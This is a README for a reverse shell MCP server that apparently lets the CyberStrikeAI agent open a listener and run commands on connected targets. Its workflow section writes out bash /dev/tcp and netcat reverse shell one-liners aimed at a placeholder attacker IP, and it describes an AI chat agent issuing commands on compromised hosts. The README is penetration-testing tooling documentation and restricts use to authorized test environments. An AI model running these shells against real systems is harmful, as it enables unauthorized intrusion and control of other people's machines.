# Reverse Shell MCP

[Chinese](README_CN.md)

Add **reverse shell** capability to CyberStrikeAI via External MCP: start/stop a TCP listener and run commands on connected targets—no backend code changes required.

## Tools

| Tool | Description |
|------|-------------|
| `reverse_shell_start_listener` | Start TCP listener on a given port; wait for the target to connect. |
| `reverse_shell_stop_listener` | Stop the listener and disconnect the current client. |
| `reverse_shell_status` | Show status: listening or not, port, connected or not, client address. |
| `reverse_shell_send_command` | Send a command to the connected reverse shell and return output. |
| `reverse_shell_disconnect` | Disconnect the current client only; listener keeps running for new connections. |

## Requirements

- Python 3.10+
- `mcp` package (included if using the project venv; otherwise: `pip install mcp`)

## Setup in CyberStrikeAI

1. **Paths**  
   Example: project root `/path/to/CyberStrikeAI-main`  
   Script: `/path/to/CyberStrikeAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py`

2. **Web UI** → **Settings** → **External MCP** → **Add External MCP**. Paste JSON (replace paths with yours):

```json
{
  "reverse-shell": {
    "command": "/path/to/CyberStrikeAI-main/venv/bin/python3",
    "args": ["/path/to/CyberStrikeAI-main/mcp-servers/reverse_shell/mcp_reverse_shell.py"],
    "description": "Reverse shell: start/stop listener, run commands on connected target",
    "timeout": 60,
    "external_mcp_enable": true
  }
}
```

   - `command`: Prefer the project **venv** Python; or use system `python3`.
   - `args`: **Must be absolute path** to `mcp_reverse_shell.py`.
   - Save, then click **Start** for this MCP to use the tools in chat.

3. **Typical workflow**
   - Call `reverse_shell_start_listener(4444)` to listen on port 4444.
   - On the target, run a reverse connection, e.g.:
     - Linux: `bash -i >& /dev/tcp/YOUR_IP/4444 0>&1` or `nc -e /bin/sh YOUR_IP 4444`
     - Or use msfvenom-generated payloads, etc.
   - After connection, use `reverse_shell_send_command("id")`, `reverse_shell_send_command("whoami")`, etc.
   - Use `reverse_shell_status` to check state, `reverse_shell_disconnect` to drop the client only, `reverse_shell_stop_listener` to stop listening.

## Run locally (optional)

```bash
# From project root, with venv
./venv/bin/python mcp-servers/reverse_shell/mcp_reverse_shell.py
```

The process talks MCP over stdio; CyberStrikeAI starts it the same way when using External MCP.

## Security

- Use only in authorized, isolated test environments.
- Listener binds to `0.0.0.0`; restrict access with firewall or network policy if the port is exposed.
